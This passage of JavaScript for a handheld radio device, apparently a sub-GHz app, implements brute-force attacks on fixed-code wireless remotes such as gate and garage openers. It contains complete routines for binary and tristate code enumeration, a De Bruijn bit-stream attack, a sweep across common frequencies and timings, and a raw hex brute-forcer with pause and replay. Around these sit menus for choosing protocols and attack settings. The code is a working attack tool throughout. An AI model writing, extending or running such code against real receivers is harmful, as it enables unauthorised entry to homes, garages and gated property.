            setTextSize(1);
            setTextColor(WHITE);
            drawString("Code: 0x" + toHex(i - 1, hexDigits) + " / 0x" + toHex(total - 1, hexDigits), L.mx, L.atkY1);
            drawString("Freq: " + freq + " MHz", L.mx, L.atkY2);
            drawString("Speed: " + cps + " c/s   ETA: " + eta + "s", L.mx, L.atkY3);
            drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, pct);
            drawFooter("ESC=Stop  SEL=Pause | " + bits + "b");
        }
    }

    subghz.txEnd();
    attackRunning = false;

    if (i >= total) {
        clearScreen();
        drawHeader("COMPLETE");
        var elapsed = (Date.now() - startTime) / 1000;
        drawCentered("All " + total + " codes sent", L.msgY1, GREEN);
        drawCentered("Time: " + elapsed.toFixed(1) + "s", L.msgY2, WHITE);
        drawCentered("Press any key", L.msgYA, GRAY);
        while (!getAnyPress()) delay(50);
    }
}

/**
 * Tristate brute-force attack with pause/manual control.
 */
function attackTristate(proto, positions, freq, repeats, frameDelay) {
    var total = 1;
    for (var p = 0; p < positions; p++) total *= 3;

    attackRunning = true;
    clearScreen();
    drawHeader("TRISTATE: " + proto.name);

    if (!subghz.txSetup(freq)) {
        drawCentered("RF init failed!", L.msgY2, RED);
        delay(2000);
        attackRunning = false;
        return;
    }

    var startTime = Date.now();
    var codesSinceLastDraw = 0;

    // Draw initial
    drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
    setTextSize(1);
    setTextColor(WHITE);
    drawString("Code: " + tristateStr(0, positions), L.mx, L.atkY1);
    drawString("Freq: " + freq + " MHz", L.mx, L.atkY2);
    drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, 0);
    drawFooter("ESC=Stop  SEL=Pause | " + proto.name);

    var i = 0;
    while (i < total) {
        if (getEscPress()) {
            clearScreen();
            drawHeader("CANCELLED");
            drawCentered("Stopped at " + i + "/" + total, L.msgY2, YELLOW);
            delay(1500);
            break;
        }

        // SEL = pause
        if (getSelPress()) {
            delay(150);
            var result = enterPauseMode(proto, i, positions, freq, total, true, repeats, frameDelay);
            if (result.action === "cancel") {
                clearScreen();
                drawHeader("CANCELLED");
                drawCentered("Stopped at code " + result.code, L.msgY2, YELLOW);
                delay(1500);
                break;
            }
            i = result.code;
            codesSinceLastDraw = 10;
            clearScreen();
            drawHeader("TRISTATE: " + proto.name);
        }

        var pulses = encodeTristate(proto, i, positions);
        for (var r = 0; r < repeats; r++) {
            subghz.txPulses(pulses);
            if (frameDelay > 0) delay(frameDelay);
        }

        codesSinceLastDraw++;
        i++;

        if (codesSinceLastDraw >= 10) {
            codesSinceLastDraw = 0;
            var pct = Math.floor(i * 100 / total);
            var elapsed = (Date.now() - startTime) / 1000;
            var cps = elapsed > 0 ? Math.floor(i / elapsed) : 0;
            var eta = cps > 0 ? Math.floor((total - i) / cps) : 0;

            drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
            setTextSize(1);
            setTextColor(WHITE);
            drawString("Code: " + tristateStr(i - 1, positions), L.mx, L.atkY1);
            drawString("Freq: " + freq + " MHz  " + cps + " c/s", L.mx, L.atkY2);
            drawString("ETA: " + eta + "s", L.mx, L.atkY3);
            drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, pct);
            drawFooter("ESC=Stop  SEL=Pause | " + proto.name);
        }
    }

    subghz.txEnd();
    attackRunning = false;

    if (i >= total) {
        clearScreen();
        drawHeader("COMPLETE");
        drawCentered("All " + total + " tristate codes sent", L.msgY1, GREEN);
        drawCentered("Press any key", L.msgYA, GRAY);
        while (!getAnyPress()) delay(50);
    }
}

/**
 * De Bruijn sequence attack (no individual pause per code — streams bits).
 */
function attackDeBruijn(proto, bits, freq, repeats) {
    clearScreen();
    drawHeader("DE BRUIJN: " + proto.name);
    drawCentered("Generating B(2," + bits + ")...", L.msgY1, YELLOW);

    var seq = generateDeBruijn(bits);
    if (!seq) {
        drawCentered("FAILED: n=" + bits + " out of range", L.msgY2, RED);
        delay(2000);
        return;
    }

    var total = seq.length;
    drawCentered("Sequence: " + total + " bits", L.msgY2, WHITE);
    drawCentered("Repeats: " + repeats, L.msgY3, WHITE);
    delay(800);

    if (!subghz.txSetup(freq)) {
        drawCentered("RF init failed!", L.msgY4, RED);
        delay(2000);
        return;
    }

    attackRunning = true;
    var startTime = Date.now();
    var cancelled = false;

    for (var rep = 0; rep < repeats && !cancelled; rep++) {
        if (proto.pilot.length > 0) {
            subghz.txPulses(proto.pilot);
        }
        var CHUNK = 64;
        for (var i = 0; i < total && !cancelled; i += CHUNK) {
            var end = Math.min(i + CHUNK, total);
            var pulses = [];
            for (var j = i; j < end; j++) {
                var t = seq[j] ? proto.t1 : proto.t0;
                for (var k = 0; k < t.length; k++) pulses.push(t[k]);
            }
            subghz.txPulses(pulses);
            if (getEscPress()) { cancelled = true; break; }
        }
        if (proto.stop.length > 0 && !cancelled) {
            subghz.txPulses(proto.stop);
        }
        if (!cancelled) {
            var pct = Math.floor((rep + 1) * 100 / repeats);
            clearScreen();
            drawHeader("DE BRUIJN: " + proto.name);
            drawCentered("Repeat " + (rep + 1) + "/" + repeats, L.atkY1, WHITE);
            drawCentered(total + " bits @ " + freq + " MHz", L.atkY2, CYAN);
            drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, pct);
            drawFooter("ESC=Cancel");
            delay(10);
        }
    }

    subghz.txEnd();
    attackRunning = false;

    clearScreen();
    if (cancelled) {
        drawHeader("CANCELLED");
        drawCentered("De Bruijn attack stopped", L.msgY2, YELLOW);
    } else {
        drawHeader("COMPLETE");
        var elapsed = (Date.now() - startTime) / 1000;
        drawCentered("All " + (1 << bits) + " codes covered", L.msgY1, GREEN);
        drawCentered(total + " bits x " + repeats + " repeats", L.msgY2, WHITE);
        drawCentered("Time: " + elapsed.toFixed(1) + "s", L.msgY3, WHITE);
    }
    drawCentered("Press any key", L.msgYA, GRAY);
    while (!getAnyPress()) delay(50);
}

/**
 * Universal sweep — cycles through multiple freq/timing/ratio combos.
 */
function attackUniversal() {
    var freqs = [433.92, 315.0, 868.35, 300.0, 310.0, 318.0, 390.0, 433.42];
    var tes = [300, 200, 450];
    var ratios = [3, 2];
    var bitLengths = [12, 10];

    var totalConfigs = freqs.length * tes.length * ratios.length * bitLengths.length;
    var configNum = 0;

    clearScreen();
    drawHeader("UNIVERSAL SWEEP");
    drawCentered(totalConfigs + " configurations", L.msgY1, YELLOW);
    drawCentered("SEL=Start  ESC=Cancel", L.msgYA, GRAY);

    while (true) {
        if (getSelPress()) { delay(200); break; }
        if (getEscPress()) { return; }
        delay(50);
    }

    for (var fi = 0; fi < freqs.length; fi++) {
        for (var bi = 0; bi < bitLengths.length; bi++) {
            for (var ti = 0; ti < tes.length; ti++) {
                for (var ri = 0; ri < ratios.length; ri++) {
                    if (getEscPress()) {
                        clearScreen();
                        drawHeader("CANCELLED");
                        drawCentered("Config " + configNum + "/" + totalConfigs, L.msgY2, YELLOW);
                        delay(1500);
                        return;
                    }
                    configNum++;
                    var te = tes[ti];
                    var ratio = ratios[ri];
                    var f = freqs[fi];
                    var b = bitLengths[bi];

                    var dynProto = {
                        name: "Universal",
                        cat: "misc",
                        t0: [te, -(te * ratio)],
                        t1: [te * ratio, -te],
                        pilot: [te, -(te * 31)],
                        stop: [],
                        freq: f,
                        bits: b,
                        mode: "binary"
                    };

                    clearScreen();
                    drawHeader("SWEEP " + configNum + "/" + totalConfigs);
                    drawCentered("F=" + f + " Te=" + te + " 1:" + ratio + " " + b + "b", L.atkY1, CYAN);
                    drawProgressBar(L.mx, L.atkY2, screenW - L.mx * 2, L.atkBarH, Math.floor(configNum * 100 / totalConfigs));
                    drawFooter("ESC=Cancel sweep");

                    attackDeBruijn(dynProto, b, f, 3);
                }
            }
        }
    }

    clearScreen();
    drawHeader("SWEEP COMPLETE");
    drawCentered("All " + totalConfigs + " configs tested", L.msgY2, GREEN);
    drawCentered("Press any key", L.msgYA, GRAY);
    while (!getAnyPress()) delay(50);
}

// ============================================================================
// RAW BRUTEFORCE — Settings & Attack (uses subghz.transmit API)
// ============================================================================

/**
 * Show RAW Bruteforce settings screen.
 * All params are edited via keyboard or cycling, then "Start attack" launches.
 */
function showRawBruteSettings() {
    var settIdx = 0;
    var editPrefix = rawPrefix;
    var editBits = rawBits;
    var editDelay = rawDelay;
    var editFreq = rawFreqHz;
    var editTe = rawTe;
    var editCount = rawCount;

    var items = [
        "Prefix (hex): ",
        "Range bits:   ",
        "Delay (ms):   ",
        "Frequency:    ",
        "TE (us):      ",
        "TX count:     ",
        "Start attack",
        "Back"
    ];

    function fmtFreq(hz) {
        return (hz / 1000000).toFixed(2) + " MHz";
    }

    function drawRawSettings() {
        clearScreen();
        drawHeader("RAW BRUTEFORCE");

        var vals = [
            "0x" + editPrefix.toString(16).toUpperCase(),
            String(editBits) + " (" + (1 << editBits) + " values)",
            String(editDelay),
            fmtFreq(editFreq),
            String(editTe),
            String(editCount),
            "",
            ""
        ];

        for (var i = 0; i < items.length; i++) {
            var y = L.rawY0 + i * L.rawH;
            if (i === settIdx) {
                drawFillRect(0, y, screenW, L.rawH - 1, HEADERBG);
                if (i === 6) setTextColor(GREEN);
                else if (i === 7) setTextColor(GRAY);
                else setTextColor(CYAN);
            } else {
                if (i === 6) setTextColor(GREEN);
                else if (i === 7) setTextColor(GRAY);
                else setTextColor(WHITE);
            }
            setTextSize(1);
            drawString(items[i] + vals[i], L.mx, y + 2);
        }

        // Info line
        setTextColor(DARKGRAY);
        var totalCodes = 1 << editBits;
        var maxVal = editPrefix + totalCodes - 1;
        drawString("Range: 0x" + editPrefix.toString(16).toUpperCase() + " -> 0x" + maxVal.toString(16).toUpperCase(), L.mx, L.ftrY - L.lineH);
        drawFooter("UP/DN=Nav  SEL=Edit  ESC=Back");
    }

    drawRawSettings();
    while (true) {
        if (getPrevPress()) {
            settIdx--;
            if (settIdx < 0) settIdx = items.length - 1;
            drawRawSettings();
            delay(120);
        }
        if (getNextPress()) {
            settIdx++;
            if (settIdx >= items.length) settIdx = 0;
            drawRawSettings();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            if (settIdx === 0) {
                // Edit prefix via keyboard
                var input = dialog.prompt(editPrefix.toString(16).toUpperCase(), 32, "Prefix (hex)");
                if (input && input.length > 0) {
                    var parsed = parseInt(input, 16);
                    if (!isNaN(parsed)) editPrefix = parsed;
                }
            } else if (settIdx === 1) {
                // Cycle bits: 1..24
                var bitOpts = [1, 2, 4, 6, 8, 10, 12, 16, 20, 24];
                var ci = 0;
                for (var b = 0; b < bitOpts.length; b++) {
                    if (bitOpts[b] === editBits) { ci = b; break; }
                }
                ci = (ci + 1) % bitOpts.length;
                editBits = bitOpts[ci];
            } else if (settIdx === 2) {
                // Edit delay via keyboard
                var input = dialog.prompt(String(editDelay), 16, "Delay ms");
                if (input && input.length > 0) {
                    var parsed = parseInt(input, 10);
                    if (!isNaN(parsed) && parsed >= 0) editDelay = parsed;
                }
            } else if (settIdx === 3) {
                // Cycle common frequencies
                var freqOpts = [300000000, 310000000, 315000000, 318000000, 390000000, 433420000, 433920000, 868350000];
                var ci = 0;
                for (var f = 0; f < freqOpts.length; f++) {
                    if (freqOpts[f] === editFreq) { ci = f; break; }
                }
                ci = (ci + 1) % freqOpts.length;
                editFreq = freqOpts[ci];
            } else if (settIdx === 4) {
                // Edit TE via keyboard
                var input = dialog.prompt(String(editTe), 16, "TE (us)");
                if (input && input.length > 0) {
                    var parsed = parseInt(input, 10);
                    if (!isNaN(parsed) && parsed > 0) editTe = parsed;
                }
            } else if (settIdx === 5) {
                // Edit TX count via keyboard
                var input = dialog.prompt(String(editCount), 16, "TX count");
                if (input && input.length > 0) {
                    var parsed = parseInt(input, 10);
                    if (!isNaN(parsed) && parsed > 0) editCount = parsed;
                }
            } else if (settIdx === 6) {
                // Start attack — save params and go
                rawPrefix = editPrefix;
                rawBits = editBits;
                rawDelay = editDelay;
                rawFreqHz = editFreq;
                rawTe = editTe;
                rawCount = editCount;
                attackRawBrute();
            } else {
                // Back
                rawPrefix = editPrefix;
                rawBits = editBits;
                rawDelay = editDelay;
                rawFreqHz = editFreq;
                rawTe = editTe;
                rawCount = editCount;
                return;
            }
            drawRawSettings();
        }
        if (getEscPress()) {
            delay(200);
            rawPrefix = editPrefix;
            rawBits = editBits;
            rawDelay = editDelay;
            rawFreqHz = editFreq;
            rawTe = editTe;
            rawCount = editCount;
            return;
        }
        delay(30);
    }
}

/**
 * Execute RAW brute-force attack using subghz.transmit().
 * Iterates from rawPrefix to rawPrefix + 2^rawBits, sending each hex value.
 * Supports pause mode (SEL) and cancel (ESC).
 */
function attackRawBrute() {
    var totalCodes = 1 << rawBits;
    var maxVal = rawPrefix + totalCodes;
    var hexDigits = Math.max(2, Math.ceil((rawPrefix + totalCodes).toString(16).length));

    attackRunning = true;
    clearScreen();
    drawHeader("RAW BRUTE");

    var startTime = Date.now();
    var codesSinceLastDraw = 0;
    var codesSent = 0;
    var freqStr = (rawFreqHz / 1000000).toFixed(2);

    // Draw initial state
    drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
    setTextSize(1);
    setTextColor(WHITE);
    drawString("Val: 0x" + rawPrefix.toString(16).toUpperCase(), L.mx, L.atkY1);
    drawString("Freq: " + freqStr + " MHz  TE:" + rawTe, L.mx, L.atkY2);
    drawString("Speed: -- c/s", L.mx, L.atkY3);
    drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, 0);
    drawFooter("ESC=Stop  SEL=Pause");

    var brute_val = rawPrefix;
    while (brute_val < maxVal) {
        // ESC = cancel
        if (getEscPress()) {
            clearScreen();
            drawHeader("CANCELLED");
            drawCentered("Stopped at 0x" + brute_val.toString(16).toUpperCase(), L.msgY2, YELLOW);
            delay(1500);
            break;
        }

        // SEL = pause
        if (getSelPress()) {
            delay(150);
            var result = enterRawPauseMode(brute_val, maxVal);
            if (result.action === "cancel") {
                clearScreen();
                drawHeader("CANCELLED");
                drawCentered("Stopped at 0x" + result.code.toString(16).toUpperCase(), L.msgY2, YELLOW);
                delay(1500);
                break;
            }
            brute_val = result.code;
            codesSinceLastDraw = 10; // force redraw
            clearScreen();
            drawHeader("RAW BRUTE");
        }

        // Transmit
        var hexStr = brute_val.toString(16).toUpperCase();
        var ok = subghz.transmit(hexStr, rawFreqHz, rawTe, rawCount);
        if (!ok) {
            drawFillRect(0, L.atkErrY, screenW, 10, BLACK);
            setTextSize(1);
            setTextColor(RED);
            drawString("TX ERROR at 0x" + hexStr, L.mx, L.atkErrY);
        }

        codesSinceLastDraw++;
        codesSent++;
        brute_val++;

        if (rawDelay > 0) delay(rawDelay);

        // Update display every 10 codes
        if (codesSinceLastDraw >= 10) {
            codesSinceLastDraw = 0;
            var pct = Math.floor(codesSent * 100 / totalCodes);
            var elapsed = (Date.now() - startTime) / 1000;
            var cps = elapsed > 0 ? (codesSent / elapsed).toFixed(1) : "--";
            var remaining = totalCodes - codesSent;
            var eta = (elapsed > 0 && codesSent > 0) ? Math.floor(remaining * elapsed / codesSent) : 0;

            drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
            setTextSize(1);
            setTextColor(WHITE);
            drawString("Val: 0x" + (brute_val - 1).toString(16).toUpperCase() + " / 0x" + (maxVal - 1).toString(16).toUpperCase(), L.mx, L.atkY1);
            drawString("Freq: " + freqStr + " MHz  TE:" + rawTe, L.mx, L.atkY2);
            drawString("Speed: " + cps + " c/s   ETA: " + eta + "s", L.mx, L.atkY3);
            drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, pct);
            drawFooter("ESC=Stop  SEL=Pause | " + codesSent + "/" + totalCodes);
        }
    }

    attackRunning = false;

    if (brute_val >= maxVal) {
        clearScreen();
        drawHeader("COMPLETE");
        var elapsed = (Date.now() - startTime) / 1000;
        drawCentered("All " + totalCodes + " codes sent", L.msgY1, GREEN);
        drawCentered("Range: 0x" + rawPrefix.toString(16).toUpperCase() + " -> 0x" + (maxVal - 1).toString(16).toUpperCase(), L.msgY2, WHITE);
        drawCentered("Time: " + elapsed.toFixed(1) + "s", L.msgY3, WHITE);
        drawCentered("Press any key", L.msgYA, GRAY);
        while (!getAnyPress()) delay(50);
    }
}

/**
 * Pause mode for RAW brute-force. Similar to enterPauseMode but sends
 * via subghz.transmit() instead of txPulses.
 */
function enterRawPauseMode(currentVal, maxVal) {
    var val = currentVal;
    var pauseIdx = 0;
    var items = ["-1 Value", "+1 Value", "Replay", "Resume", "Cancel"];
    var itemCols = [CYAN, CYAN, GREEN, BLUE, RED];

    function drawRawPause() {
        clearScreen();
        drawFillRect(0, 0, screenW, L.pHdrH, color(60, 30, 0));
        setTextSize(1);
        setTextColor(ORANGE);
        var hdr = "|| PAUSED — RAW BRUTE";
        var tw = hdr.length * 6;
        drawString(hdr, Math.floor((screenW - tw) / 2), L.pHdrTY);

        // Current value — adaptive text size
        setTextSize(L.pCSz);
        setTextColor(WHITE);
        var vs = "0x" + val.toString(16).toUpperCase();
        var tw2 = vs.length * L.pCW;
        drawString(vs, Math.floor((screenW - tw2) / 2), L.pCY);

        // Value number
        setTextSize(1);
        setTextColor(GRAY);
        var numStr = "Value " + (val - rawPrefix) + " / " + ((maxVal - 1) - rawPrefix);
        drawString(numStr, Math.floor((screenW - numStr.length * 6) / 2), L.pNY);

        // Info
        setTextColor(CYAN);
        drawString((rawFreqHz / 1000000).toFixed(2) + " MHz  TE:" + rawTe + "  Cnt:" + rawCount, L.mx, L.pIY);

        // Menu
        var btnTxtOff = Math.max(1, Math.floor((L.pBH - 8) / 2));
        for (var i = 0; i < items.length; i++) {
            var y = L.pMY + i * L.pBSp;
            if (y + L.pBH > L.ftrY) break;

            if (i === pauseIdx) {
                drawFillRoundRect(L.mx, y, screenW - L.mx * 2, L.pBH, 3, HEADERBG);
                setTextColor(itemCols[i]);
            } else {
                setTextColor(GRAY);
            }
            setTextSize(1);
            drawString(items[i], L.mx + 8, y + btnTxtOff);

            // Show value hint for -1/+1
            if (i === 0 && val > rawPrefix) {
                var prev = "0x" + (val - 1).toString(16).toUpperCase();
                setTextColor(DARKGRAY);
                drawString(prev, screenW - prev.length * 6 - L.mx - 2, y + btnTxtOff);
            }
            if (i === 1 && val < maxVal - 1) {
                var next = "0x" + (val + 1).toString(16).toUpperCase();
                setTextColor(DARKGRAY);
                drawString(next, screenW - next.length * 6 - L.mx - 2, y + btnTxtOff);
            }
        }

        drawFooter("UP/DN=Nav  SEL=Action  ESC=Resume");
    }

    drawRawPause();

    while (true) {
        if (getPrevPress()) {
            pauseIdx--;
            if (pauseIdx < 0) pauseIdx = items.length - 1;
            drawRawPause();
            delay(120);
        }
        if (getNextPress()) {
            pauseIdx++;
            if (pauseIdx >= items.length) pauseIdx = 0;
            drawRawPause();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            if (pauseIdx === 0) {
                // -1 Value
                if (val > rawPrefix) {
                    val--;
                    var hexStr = val.toString(16).toUpperCase();
                    subghz.transmit(hexStr, rawFreqHz, rawTe, rawCount);
                }
                drawRawPause();
            } else if (pauseIdx === 1) {
                // +1 Value
                if (val < maxVal - 1) {
                    val++;
                    var hexStr = val.toString(16).toUpperCase();
                    subghz.transmit(hexStr, rawFreqHz, rawTe, rawCount);
                }
                drawRawPause();
            } else if (pauseIdx === 2) {
                // Replay
                drawFillRect(screenW - 30, L.pCY, 26, 12, RED);
                setTextSize(1);
                setTextColor(WHITE);
                drawString("TX", screenW - 26, L.pCY + 2);
                var hexStr = val.toString(16).toUpperCase();
                subghz.transmit(hexStr, rawFreqHz, rawTe, rawCount);
                drawRawPause();
            } else if (pauseIdx === 3) {
                // Resume
                return { action: "resume", code: val };
            } else if (pauseIdx === 4) {
                // Cancel
                return { action: "cancel", code: val };
            }
        }
        if (getEscPress()) {
            delay(200);
            return { action: "resume", code: val };
        }
        delay(30);
    }
}

// ============================================================================
// CATEGORY SELECTION SCREEN
// ============================================================================

function showCategoryScreen() {
    var idx = selectedCatIdx;

    function drawCats() {
        clearScreen();
        drawHeader("SELECT CATEGORY");

        var itemH = L.catH;
        var startY = L.catY0;
        var maxVisible = L.catVis;

        if (idx < catScrollTop) catScrollTop = idx;
        if (idx >= catScrollTop + maxVisible) catScrollTop = idx - maxVisible + 1;

        for (var i = 0; i < maxVisible; i++) {
            var ci = catScrollTop + i;
            if (ci >= CATEGORIES.length) break;

            var y = startY + i * itemH;
            var cat = CATEGORIES[ci];
            var isSelected = (ci === idx);

            if (isSelected) {
                drawFillRoundRect(2, y, screenW - 4, itemH - 2, 3, HEADERBG);
                setTextColor(cat.col);
            } else {
                setTextColor(GRAY);
            }

            // Draw icon
            var iconOff = Math.max(1, Math.floor((itemH - 2 - 12) / 2));
            drawCategoryIcon(cat.id, L.mx, y + iconOff, isSelected ? cat.iconCol : DARKGRAY);

            // Label + count
            setTextSize(1);
            var count = filterProtocols(cat.id).length;
            var label = cat.label + " (" + count + ")";
            drawString(label, L.mx + 16, y + Math.max(2, Math.floor((itemH - 2 - 8) / 2)));
        }

        drawFooter("UP/DN=Nav  SEL=Open  ESC=Back");
    }

    drawCats();
    while (true) {
        if (getPrevPress()) {
            idx--;
            if (idx < 0) idx = CATEGORIES.length - 1;
            drawCats();
            delay(120);
        }
        if (getNextPress()) {
            idx++;
            if (idx >= CATEGORIES.length) idx = 0;
            drawCats();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            selectedCatIdx = idx;
            return CATEGORIES[idx].id;
        }
        if (getEscPress()) {
            delay(200);
            return null;
        }
        delay(30);
    }
}

// ============================================================================
// PROTOCOL SELECTION (within a category)
// ============================================================================

function drawProtocolList(protos, selIdx, catLabel) {
    clearScreen();
    drawHeader(catLabel);

    var itemH = L.proH;
    var startY = L.proY0;
    var maxVisible = L.proVis;

    if (selIdx < protoScrollTop) protoScrollTop = selIdx;
    if (selIdx >= protoScrollTop + maxVisible) protoScrollTop = selIdx - maxVisible + 1;

    for (var i = 0; i < maxVisible; i++) {
        var pidx = protoScrollTop + i;
        if (pidx >= protos.length) break;

        var y = startY + i * itemH;
        var proto = protos[pidx];
        var isSelected = (pidx === selIdx);

        if (isSelected) {
            drawFillRect(0, y, screenW, itemH, HEADERBG);
            setTextColor(CYAN);
        } else {
            setTextColor(WHITE);
        }

        setTextSize(1);
        var label = proto.name + " " + proto.bits + "b " + proto.freq + "M";
        if (proto.mode === "tristate") label += " [T]";
        drawString(label, L.mx, y + Math.max(1, Math.floor((itemH - 8) / 2)));
    }

    // Scrollbar
    if (protos.length > maxVisible) {
        var sbH = Math.max(8, Math.floor(maxVisible * L.cH / protos.length));
        var sbY = startY + Math.floor(protoScrollTop * (L.cH - sbH) / Math.max(1, protos.length - maxVisible));
        drawFillRect(screenW - 3, sbY, 3, sbH, CYAN);
    }

    drawFooter("UP/DN=Nav  SEL=Choose  ESC=Back");
}

function handleProtocolSelection(catId) {
    var protos = filterProtocols(catId);
    if (protos.length === 0) {
        clearScreen();
        drawHeader("EMPTY");
        drawCentered("No protocols in this category", L.msgY2, YELLOW);
        delay(1500);
        return null;
    }

    var catLabel = "ALL PROTOCOLS";
    for (var c = 0; c < CATEGORIES.length; c++) {
        if (CATEGORIES[c].id === catId) { catLabel = CATEGORIES[c].label; break; }
    }

    var selIdx = 0;
    protoScrollTop = 0;
    drawProtocolList(protos, selIdx, catLabel);

    while (true) {
        if (getPrevPress()) {
            selIdx--;
            if (selIdx < 0) selIdx = protos.length - 1;
            drawProtocolList(protos, selIdx, catLabel);
            delay(120);
        }
        if (getNextPress()) {
            selIdx++;
            if (selIdx >= protos.length) selIdx = 0;
            drawProtocolList(protos, selIdx, catLabel);
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            return protos[selIdx];
        }
        if (getEscPress()) {
            delay(200);
            return null;
        }
        delay(30);
    }
}

// ============================================================================
// SETTINGS MENU
// ============================================================================

function showSettings(proto) {
    var settIdx = 0;
    var editFreq = customFreq > 0 ? customFreq : proto.freq;
    var editBits = customBits > 0 ? customBits : proto.bits;
    var editRepeats = attackRepeats;
    var editDelay = interFrameDelay;

    var items = ["Frequency: ", "Bits: ", "Repeats: ", "Frame delay: ", "Reset defaults", "Back"];

    function drawSettings() {
        clearScreen();
        drawHeader("SETTINGS: " + proto.name);

        var vals = [editFreq + " MHz", String(editBits), String(editRepeats), editDelay + " ms", "", ""];

        for (var i = 0; i < items.length; i++) {
            var y = L.setY0 + i * L.setH;
            if (i === settIdx) {
                drawFillRect(0, y, screenW, L.setH - 2, HEADERBG);
                setTextColor(CYAN);
            } else {
                setTextColor(WHITE);
            }
            setTextSize(1);
            drawString(items[i] + vals[i], L.mx, y + 2);
        }
        drawFooter("UP/DN=Nav  SEL=Edit  ESC=Back");
    }

    drawSettings();
    while (true) {
        if (getPrevPress()) {
            settIdx--;
            if (settIdx < 0) settIdx = items.length - 1;
            drawSettings();
            delay(120);
        }
        if (getNextPress()) {
            settIdx++;
            if (settIdx >= items.length) settIdx = 0;
            drawSettings();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            if (settIdx === 0) {
                var freqOpts = [300.0, 310.0, 315.0, 318.0, 390.0, 433.42, 433.92, 868.35];
                var ci = 0;
                for (var f = 0; f < freqOpts.length; f++) {
                    if (abs(freqOpts[f] - editFreq) < 0.01) { ci = f; break; }
                }
                ci = (ci + 1) % freqOpts.length;
                editFreq = freqOpts[ci];
            } else if (settIdx === 1) {
                var bitOpts = [8, 10, 12, 16, 20, 24, 32];
                var ci = 0;
                for (var b = 0; b < bitOpts.length; b++) {
                    if (bitOpts[b] === editBits) { ci = b; break; }
                }
                ci = (ci + 1) % bitOpts.length;
                editBits = bitOpts[ci];
            } else if (settIdx === 2) {
                var repOpts = [1, 2, 3, 5, 10];
                var ci = 0;
                for (var r = 0; r < repOpts.length; r++) {
                    if (repOpts[r] === editRepeats) { ci = r; break; }
                }
                ci = (ci + 1) % repOpts.length;
                editRepeats = repOpts[ci];
            } else if (settIdx === 3) {
                var delOpts = [0, 5, 10, 20, 50, 100];
                var ci = 0;
                for (var d = 0; d < delOpts.length; d++) {
                    if (delOpts[d] === editDelay) { ci = d; break; }
                }
                ci = (ci + 1) % delOpts.length;
                editDelay = delOpts[ci];
            } else if (settIdx === 4) {
                editFreq = proto.freq;
                editBits = proto.bits;
                editRepeats = 3;
                editDelay = 10;
            } else {
                customFreq = editFreq;
                customBits = editBits;
                attackRepeats = editRepeats;
                interFrameDelay = editDelay;
                return;
            }
            drawSettings();
        }
        if (getEscPress()) {
            delay(200);
            customFreq = editFreq;
            customBits = editBits;
            attackRepeats = editRepeats;
            interFrameDelay = editDelay;
            return;
        }
        delay(30);
    }
}

// ============================================================================
// ATTACK MODE MENU (for selected protocol)
// ============================================================================

function showAttackMenu(proto) {
    var freq = customFreq > 0 ? customFreq : proto.freq;
    var bits = customBits > 0 ? customBits : proto.bits;

    var menuIdx = 0;
    var menuItems = [];

    if (proto.mode === "tristate") {
        menuItems.push({ label: "Tristate Brute-Force", action: "tristate", col: MAGENTA });
    }
    menuItems.push({ label: "Binary Brute-Force", action: "binary", col: GREEN });
    if (bits <= 16) {
        menuItems.push({ label: "De Bruijn Attack", action: "debruijn", col: YELLOW });
    }
    menuItems.push({ label: "Protocol Info", action: "info", col: WHITE });
    menuItems.push({ label: "Settings", action: "settings", col: BLUE });
    menuItems.push({ label: "Back", action: "back", col: GRAY });

    function drawMenu() {
        clearScreen();
        drawHeader(proto.name + " | " + freq + "MHz " + bits + "b");

        for (var i = 0; i < menuItems.length; i++) {
            var y = L.amY0 + i * L.amH;
            if (i === menuIdx) {
                drawFillRoundRect(4, y, screenW - 8, L.amH - 2, 3, HEADERBG);
                setTextColor(menuItems[i].col);
            } else {
                setTextColor(GRAY);
            }
            setTextSize(1);
            drawString(menuItems[i].label, 10, y + Math.max(1, Math.floor((L.amH - 2 - 8) / 2)));
        }

        // Keyspace info
        setTextColor(DARKGRAY);
        var ks;
        if (proto.mode === "tristate") {
            var t = 1;
            for (var p = 0; p < bits; p++) t *= 3;
            ks = "Tristate: " + t + " codes";
        } else {
            ks = "Binary: " + (1 << bits) + " codes";
        }
        drawString(ks, L.mx, L.ftrY - L.lineH);
        drawFooter("UP/DN=Nav  SEL=Go  ESC=Back");
    }

    drawMenu();
    while (true) {
        if (getPrevPress()) {
            menuIdx--;
            if (menuIdx < 0) menuIdx = menuItems.length - 1;
            drawMenu();
            delay(120);
        }
        if (getNextPress()) {
            menuIdx++;
            if (menuIdx >= menuItems.length) menuIdx = 0;
            drawMenu();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            var action = menuItems[menuIdx].action;
            if (action === "binary") {
                attackBinary(proto, bits, freq, attackRepeats, interFrameDelay);
                drawMenu();
            } else if (action === "tristate") {
                attackTristate(proto, bits, freq, attackRepeats, interFrameDelay);
                drawMenu();
            } else if (action === "debruijn") {
                attackDeBruijn(proto, bits, freq, 5);
                drawMenu();
            } else if (action === "info") {
                showProtoInfo(proto);
                drawMenu();
            } else if (action === "settings") {
                showSettings(proto);
                freq = customFreq > 0 ? customFreq : proto.freq;
                bits = customBits > 0 ? customBits : proto.bits;
                drawMenu();
            } else {
                return;
            }
        }
        if (getEscPress()) {
            delay(200);
            return;
        }
        delay(30);
    }
}

// ============================================================================
// PROTOCOL INFO SCREEN
// ============================================================================

function showProtoInfo(proto) {
    clearScreen();
    drawHeader("PROTOCOL: " + proto.name);

    var y = L.infY0;
    setTextSize(1);

    setTextColor(CYAN);  drawString("Mode: " + proto.mode, L.mx, y); y += L.infH;
    setTextColor(WHITE); drawString("Freq: " + proto.freq + " MHz", L.mx, y); y += L.infH;
